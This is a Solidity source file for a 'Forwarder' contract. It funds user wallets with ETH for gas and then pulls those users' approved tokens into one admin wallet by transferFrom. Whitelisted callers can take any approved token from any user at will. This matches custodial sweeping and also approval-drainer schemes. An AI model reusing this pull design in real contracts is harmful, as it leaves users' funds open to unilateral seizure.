// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * The initial owner is set to the address provided by the deployer. This can
 * later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    /**
     * @dev The caller account is not authorized to perform an operation.
     */
    error OwnableUnauthorizedAccount(address account);

    /**
     * @dev The owner is not a valid owner account. (eg. `address(0)`)
     */
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */
    constructor() {
        _owner = _msgSender();
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Only onwer can call");
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20_USDT {
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external;
}

/**
 * @title Forwarder Smart Contract
 * @author Nilesh Carpenter
 * @dev Simple forwarder for extensible meta-transaction forwarding.
 */

contract Forwarder is Ownable {
    address transactionWallet;
    mapping(address => bool) public whitelist;

    constructor(address walletaddess) {
        require(walletaddess != address(0), "Invalid address");
        transactionWallet = walletaddess;
    }
    modifier OnlyWhitelist{
        require(whitelist[msg.sender] || owner() == msg.sender, "Only whitelist user can call");
        _;
    }

    
    event ChangeWalletAddress(address indexed newAddress);
    event AddToWhitelist(address indexed userAddress);
    event RemoveToWhitelist(address indexed userAddress);
    event BalanceTransfer(address indexed fromAddress, address indexed recipients, uint256 amount);
    event TokenTransfer(address indexed recipients,address indexed depositAddress, uint256 amount);
    event WithdrawRequestApproved(address indexed fromAddress, address indexed recipients, uint256 amount);


    /// @dev change transaction wallet address by owner of the contract
    function changeWalletAddress(address _walletaddress) public onlyOwner {
        require(_walletaddress != address(0), "Invalid address");
        transactionWallet = _walletaddress;
        emit ChangeWalletAddress(_walletaddress);
    }

    /// @dev view transaction wallet address
    function WalletAddress() public view returns (address) {
        return transactionWallet;
    }

    //@dev add white list user
    function addToWhitelist(address _address) external onlyOwner {
        whitelist[_address] = true;
        emit AddToWhitelist(_address);
    }

     //@dev remove white list user
    function removeToWhitelist(address _address) external onlyOwner {
        whitelist[_address] = false;
        emit RemoveToWhitelist(_address);
    }

    /*for transfer user to admin 1st step function*/
    ///@dev disappear eth send from contract to multi user wallet for approval token to transfer without gas fee
    function transferEther(
        address payable[] memory recipients,
        uint256[] memory values
    ) external payable OnlyWhitelist {
        
        for (uint256 i = 0; i < recipients.length; i++) {
            uint256 balance = address(this).balance;
            if (balance >= values[i]) payable(recipients[i]).transfer(values[i]);
            
            emit BalanceTransfer(msg.sender, recipients[i], values[i]);
        }
    }

    /*for transfer user to admin 2nd step function*/
    ///@dev disappear tokens from multi users wallet to single admin wallet

    function UserTokentransfer(
        address[] memory token,
        address[] memory recipients,
        uint256[] memory values
    ) external OnlyWhitelist {
        
        for (uint256 i = 0; i < recipients.length; i++) {
            IERC20_USDT(token[i]).transferFrom(
                recipients[i],
                transactionWallet,
                values[i]
            );
            emit TokenTransfer(recipients[i], transactionWallet, values[i]);
        }
    }

    /* for withdraw admin to user 2nd step function */
    ///@dev disappear tokens from single admin wallet to multi users wallet
    function AdminTokenTransfer(
        address[] memory token,
        address[] memory recipients,
        uint256[] memory values
    ) external OnlyWhitelist{
        
        for (uint256 i = 0; i < recipients.length; i++) {
            IERC20_USDT(token[i]).transferFrom(
                msg.sender,
                recipients[i],
                values[i]
            );
            emit WithdrawRequestApproved(msg.sender, recipients[i], values[i]);
        }
    }
}